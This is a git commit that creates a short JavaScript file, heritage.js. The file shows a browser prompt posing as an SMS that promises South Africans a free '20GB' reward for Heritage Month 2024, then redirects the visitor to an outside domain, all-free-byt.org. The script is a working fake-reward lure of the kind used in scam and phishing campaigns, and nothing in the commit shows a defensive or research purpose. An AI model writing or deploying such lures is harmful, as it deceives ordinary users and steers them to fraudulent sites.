f5aa6e248cea229a4ae10a93f4eb96cc1285d676
Imohekpe1 <169145829+Imohekpe1@users.noreply.github.com>
2024-09-04 05:37:46 -0700

    Create heritage.js

---
+++ heritage.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVATE 20GB'
+password=prompt('SMS: Dear South Africans, This is a reward for you as we celebrate The South Africa heritage Month 2024, press Ok to get offer now ','ACTIVATE 20GB');
+if (password != 'ACTIVATE 20GB') {
+location.href='https://all-free-byt.org/heritage-month.html';
+}
